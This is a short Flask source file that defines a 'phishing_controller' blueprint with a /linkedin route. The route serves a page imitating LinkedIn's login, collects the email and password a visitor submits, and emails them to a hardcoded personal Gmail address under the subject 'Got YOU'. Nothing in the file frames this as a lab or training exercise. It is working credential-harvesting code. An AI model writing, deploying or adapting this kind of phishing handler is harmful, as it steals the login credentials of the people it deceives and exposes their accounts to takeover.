from datetime import datetime, timedelta
from flask import Blueprint, jsonify, request, render_template
import random

from werkzeug.security import generate_password_hash, check_password_hash
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
from itsdangerous import URLSafeTimedSerializer

from repository.quiz import QuizRepository
from utils.mail import send_email, send_verification_email
from secret.jwt import jwt_secret



phishing_controller = Blueprint('phishing_controller', __name__)

@phishing_controller.route('/linkedin', methods=['GET', 'POST'])
def linkedin():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        send_email("kamrannn.mk@gmail.com", "Got YOU", f"LinkedIn Email {email}, Password {password}")
        return render_template('linkedin.html', email=email, password=password)
    return render_template('linkedin.html')